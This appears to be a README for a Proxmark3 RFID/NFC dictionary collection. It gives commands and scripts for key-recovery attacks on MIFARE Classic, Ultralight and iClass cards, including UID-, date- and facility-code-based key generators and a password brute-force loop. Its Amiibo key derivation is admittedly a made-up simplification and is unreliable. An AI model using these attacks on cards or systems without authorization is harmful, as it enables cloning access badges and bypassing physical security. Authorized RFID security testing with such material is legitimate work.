# Dictionary Files for RFID/NFC Security Testing

## Overview
This directory contains dictionary files for various RFID/NFC card types. These dictionaries are used for automated key/password recovery attacks.

## Dictionary Types

### MIFARE Classic Keys
- `mfkeys.dic` - Standard MIFARE Classic keys
- `mfkeys_extended.dic` - Extended key list with vendor-specific keys
- `mfkeys_custom.dic` - Custom generated keys based on patterns

### MIFARE Ultralight Passwords
- `mfu_passwords.dic` - Common MIFARE Ultralight passwords
- `mfu_uid_based.dic` - UID-based password algorithms
- `mfu_vendor_specific.dic` - Vendor-specific password patterns

### iClass Keys
- `iclass_default_keys.dic` - Default iClass keys
- `iclass_elite_keys.dic` - Elite key variations
- `iclass_custom.dic` - Custom iClass keys

### LF Card Passwords
- `t55xx_passwords.dic` - T55xx password dictionary
- `em4x05_passwords.dic` - EM4x05 password list
- `lf_common.dic` - Common LF card passwords

## Usage Examples

### MIFARE Classic Dictionary Attack
```bash
# Use standard dictionary
hf mf chk *1 ? d mfkeys.dic

# Use extended dictionary
hf mf chk *1 ? d mfkeys_extended.dic

# Check specific sector with custom dictionary
hf mf chk 1 ? d mfkeys_custom.dic
```

### MIFARE Ultralight Password Testing
```bash
# Test common passwords
for pwd in $(cat mfu_passwords.dic); do
    echo "Testing password: $pwd"
    hf mfu dump -k $pwd
done

# Automated password testing script
./test_mfu_passwords.sh mfu_passwords.dic
```

### iClass Dictionary Attack
```bash
# Standard iClass dictionary attack
hf iclass chk f iclass_default_keys.dic

# Extended key testing
hf iclass chk f iclass_elite_keys.dic
```

## Dictionary Generation Scripts

### Generate UID-based Keys
```python
#!/usr/bin/env python3
# generate_uid_keys.py - Generate UID-based key dictionaries

def generate_mifare_keys(uid):
    """Generate MIFARE Classic keys based on UID"""
    keys = []
    uid_bytes = bytes.fromhex(uid.replace(' ', ''))
    
    # Pattern 1: UID repeated
    if len(uid_bytes) == 4:
        key = uid_bytes + uid_bytes + uid_bytes[:4]
        keys.append(key.hex().upper())
    
    # Pattern 2: UID XOR with 0xFF
    xor_key = bytes([b ^ 0xFF for b in uid_bytes])
    if len(xor_key) == 4:
        key = xor_key + xor_key + xor_key[:4]
        keys.append(key.hex().upper())
    
    # Pattern 3: UID with checksum
    checksum = sum(uid_bytes) & 0xFF
    key = uid_bytes + bytes([checksum]) * (12 - len(uid_bytes))
    keys.append(key.hex().upper())
    
    return keys

def generate_ultralight_passwords(uid):
    """Generate MIFARE Ultralight passwords based on UID"""
    passwords = []
    uid_bytes = bytes.fromhex(uid.replace(' ', ''))
    
    # Transport algorithm (simplified)
    if len(uid_bytes) >= 7:
        pwd = uid_bytes[1] ^ uid_bytes[2] ^ uid_bytes[3] ^ uid_bytes[6]
        pwd |= (uid_bytes[2] ^ uid_bytes[3] ^ uid_bytes[4] ^ uid_bytes[7]) << 8
        pwd |= (uid_bytes[3] ^ uid_bytes[4] ^ uid_bytes[5] ^ uid_bytes[0]) << 16
        pwd |= (uid_bytes[4] ^ uid_bytes[5] ^ uid_bytes[6] ^ uid_bytes[1]) << 24
        passwords.append(f"{pwd:08X}")
    
    # Amiibo algorithm (Nintendo)
    if len(uid_bytes) >= 7:
        # Simplified Amiibo key derivation
        key_data = uid_bytes[:7]
        # This is a simplified version - actual algorithm is more complex
        pwd = sum(key_data) & 0xFFFFFFFF
        passwords.append(f"{pwd:08X}")
    
    return passwords

if __name__ == "__main__":
    # Example usage
    test_uid = "04A1B2C3D4E5F6"
    
    print("MIFARE Classic keys:")
    for key in generate_mifare_keys(test_uid[:8]):
        print(key)
    
    print("\nMIFARE Ultralight passwords:")
    for pwd in generate_ultralight_passwords(test_uid):
        print(pwd)
```

### Generate Date-based Keys
```python
#!/usr/bin/env python3
# generate_date_keys.py - Generate date-based key dictionaries

from datetime import datetime, timedelta

def generate_date_keys():
    """Generate keys based on common date patterns"""
    keys = []
    
    # Current year and surrounding years
    current_year = datetime.now().year
    years = range(current_year - 10, current_year + 2)
    
    for year in years:
        # YYYY0000 pattern
        keys.append(f"{year:04d}00000000")
        
        # YYYYMM00 patterns for each month
        for month in range(1, 13):
            keys.append(f"{year:04d}{month:02d}000000")
            
            # YYYYMMDD patterns for first day of month
            keys.append(f"{year:04d}{month:02d}01000000")
    
    # Common date formats
    today = datetime.now()
    
    # DDMMYYYY
    keys.append(f"{today.day:02d}{today.month:02d}{today.year:04d}")
    
    # MMDDYYYY
    keys.append(f"{today.month:02d}{today.day:02d}{today.year:04d}")
    
    # YYYYMMDD
    keys.append(f"{today.year:04d}{today.month:02d}{today.day:02d}")
    
    return keys

if __name__ == "__main__":
    date_keys = generate_date_keys()
    
    with open('date_based_keys.dic', 'w') as f:
        for key in date_keys:
            f.write(key + '\n')
    
    print(f"Generated {len(date_keys)} date-based keys")
```

### Generate Facility Code Keys
```python
#!/usr/bin/env python3
# generate_facility_keys.py - Generate facility code based keys

def generate_facility_keys(facility_codes):
    """Generate keys based on facility codes"""
    keys = []
    
    for facility in facility_codes:
        # Facility code repeated
        key = f"{facility:04X}" * 3
        keys.append(key)
        
        # Facility code with incremental patterns
        for i in range(256):
            key = f"{facility:04X}{i:04X}00000000"
            keys.append(key)
        
        # Facility code with common suffixes
        common_suffixes = ["0000", "FFFF", "1234", "ABCD"]
        for suffix in common_suffixes:
            key = f"{facility:04X}{suffix}00000000"
            keys.append(key)
    
    return keys

if __name__ == "__main__":
    # Common facility codes (examples)
    facilities = [1, 10, 100, 123, 255, 1000]
    
    facility_keys = generate_facility_keys(facilities)
    
    with open('facility_based_keys.dic', 'w') as f:
        for key in facility_keys:
            f.write(key + '\n')
    
    print(f"Generated {len(facility_keys)} facility-based keys")
```

## Dictionary Maintenance

### Updating Dictionaries
```bash
#!/bin/bash
# update_dictionaries.sh - Update dictionary files

echo "Updating dictionary files..."

# Download latest community dictionaries
wget -O mfkeys_community.dic "https://example.com/latest/mfkeys.dic"

# Merge with existing dictionaries
cat mfkeys.dic mfkeys_community.dic | sort | uniq > mfkeys_merged.dic

# Generate custom keys based on recent findings
python3 generate_uid_keys.py >> mfkeys_custom.dic
python3 generate_date_keys.py >> mfkeys_custom.dic

# Remove duplicates
sort mfkeys_custom.dic | uniq > mfkeys_custom_clean.dic
mv mfkeys_custom_clean.dic mfkeys_custom.dic

echo "Dictionary update complete"
```

### Dictionary Statistics
```python
#!/usr/bin/env python3
# dict_stats.py - Analyze dictionary statistics

import os
import glob

def analyze_dictionary(filename):
    """Analyze dictionary file statistics"""
    if not os.path.exists(filename):
        return None
    
    with open(filename, 'r') as f:
        keys = [line.strip() for line in f if line.strip()]
    
    stats = {
        'filename': filename,
        'total_keys': len(keys),
        'unique_keys': len(set(keys)),
        'duplicates': len(keys) - len(set(keys)),
        'key_lengths': {}
    }
    
    # Analyze key lengths
    for key in keys:
        length = len(key)
        stats['key_lengths'][length] = stats['key_lengths'].get(length, 0) + 1
    
    return stats

def main():
    print("Dictionary Statistics")
    print("=" * 50)
    
    dict_files = glob.glob("*.dic")
    
    for dict_file in sorted(dict_files):
        stats = analyze_dictionary(dict_file)
        if stats:
            print(f"\nFile: {stats['filename']}")
            print(f"Total keys: {stats['total_keys']}")
            print(f"Unique keys: {stats['unique_keys']}")
            print(f"Duplicates: {stats['duplicates']}")
            print("Key lengths:")
            for length, count in sorted(stats['key_lengths'].items()):
                print(f"  {length} chars: {count} keys")

if __name__ == "__main__":
    main()
```

## Testing Scripts

### Automated Dictionary Testing
```bash
#!/bin/bash
# test_dictionaries.sh - Test dictionary effectiveness

DICT_FILE="$1"
CARD_TYPE="$2"

if [ -z "$DICT_FILE" ] || [ -z "$CARD_TYPE" ]; then
    echo "Usage: $0 <dictionary_file> <card_type>"
    echo "Card types: mifare_classic, mifare_ultralight, iclass"
    exit 1
fi

echo "Testing dictionary: $DICT_FILE"
echo "Card type: $CARD_TYPE"

case "$CARD_TYPE" in
    "mifare_classic")
        echo "Running MIFARE Classic dictionary attack..."
        pm3 -c "hf mf chk *1 ? d $DICT_FILE" | tee test_results.log
        ;;
    "mifare_ultralight")
        echo "Running MIFARE Ultralight password test..."
        while IFS= read -r password; do
            echo "Testing password: $password"
            result=$(pm3 -c "hf mfu dump -k $password" 2>&1)
            if echo "$result" | grep -q "dump completed"; then
                echo "SUCCESS: Password $password worked!"
                break
            fi
        done < "$DICT_FILE"
        ;;
    "iclass")
        echo "Running iClass dictionary attack..."
        pm3 -c "hf iclass chk f $DICT_FILE" | tee test_results.log
        ;;
    *)
        echo "Unknown card type: $CARD_TYPE"
        exit 1
        ;;
esac

echo "Dictionary test complete"
```

### Success Rate Analysis
```python
#!/usr/bin/env python3
# success_analysis.py - Analyze dictionary success rates

import re
import json
from datetime import datetime

def analyze_test_results(log_file):
    """Analyze test results from dictionary attacks"""
    results = {
        'timestamp': datetime.now().isoformat(),
        'total_keys_tested': 0,
        'successful_keys': [],
        'success_rate': 0.0,
        'most_common_keys': {}
    }
    
    try:
        with open(log_file, 'r') as f:
            content = f.read()
        
        # Extract successful keys (pattern may vary by card type)
        key_matches = re.findall(r'key.*?([A-F0-9]{12})', content, re.IGNORECASE)
        results['successful_keys'] = list(set(key_matches))
        
        # Count total keys tested
        total_match = re.search(r'tested.*?(\d+).*?keys', content, re.IGNORECASE)
        if total_match:
            results['total_keys_tested'] = int(total_match.group(1))
        
        # Calculate success rate
        if results['total_keys_tested'] > 0:
            results['success_rate'] = len(results['successful_keys']) / results['total_keys_tested']
        
        # Track most common successful keys
        for key in results['successful_keys']:
            results['most_common_keys'][key] = results['most_common_keys'].get(key, 0) + 1
    
    except FileNotFoundError:
        print(f"Log file {log_file} not found")
    
    return results

if __name__ == "__main__":
    results = analyze_test_results('test_results.log')
    
    print("Dictionary Attack Analysis")
    print("=" * 40)
    print(f"Total keys tested: {results['total_keys_tested']}")
    print(f"Successful keys: {len(results['successful_keys'])}")
    print(f"Success rate: {results['success_rate']:.2%}")
    
    if results['successful_keys']:
        print("\nSuccessful keys:")
        for key in results['successful_keys']:
            print(f"  {key}")
    
    # Save results
    with open('analysis_results.json', 'w') as f:
        json.dump(results, f, indent=2)
```

## Dictionary Sources

### Community Sources
- Proxmark3 RRG repository
- RFID research papers
- Security conference presentations
- Community forums and wikis

### Commercial Sources
- Professional penetration testing tools
- Security vendor databases
- Specialized RFID security products

### Custom Generation
- UID-based algorithms
- Facility code patterns
- Date-based keys
- Vendor-specific patterns

## Best Practices

### Dictionary Management
1. **Regular Updates**: Keep dictionaries current with latest findings
2. **Deduplication**: Remove duplicate entries to improve performance
3. **Categorization**: Organize by card type and attack method
4. **Documentation**: Document sources and generation methods

### Testing Efficiency
1. **Prioritization**: Test most common keys first
2. **Parallel Testing**: Use multiple attack vectors simultaneously
3. **Smart Ordering**: Order keys by success probability
4. **Early Termination**: Stop testing once successful key is found

### Legal Compliance
1. **Authorized Testing Only**: Use dictionaries only on authorized systems
2. **Source Documentation**: Document dictionary sources for legal compliance
3. **Responsible Sharing**: Share dictionaries responsibly within security community
4. **Privacy Protection**: Avoid including personally identifiable information

---

**Note**: These dictionaries are for authorized security testing only. Always ensure you have proper authorization before using these tools on any RFID/NFC systems.
